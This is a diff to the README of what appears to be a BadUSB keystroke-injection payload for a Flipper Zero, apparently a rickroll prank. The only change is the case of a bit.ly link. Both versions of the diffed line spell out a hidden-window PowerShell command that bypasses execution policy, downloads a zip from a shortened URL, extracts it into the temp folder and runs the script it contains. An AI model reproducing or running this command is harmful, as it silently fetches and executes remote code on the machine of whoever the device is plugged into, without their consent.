@@ -26,7 +26,7 @@ YouTube video - [click here](https://youtube.com/shorts/XRY_MEYQUxA)
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
 ```
-powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'bit.ly/BADUSB-NGGYU' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'bit.ly/BadUSB-NGGYU' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
 ```
 
 Inspired by : [I-Am-Jakoby](https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB)
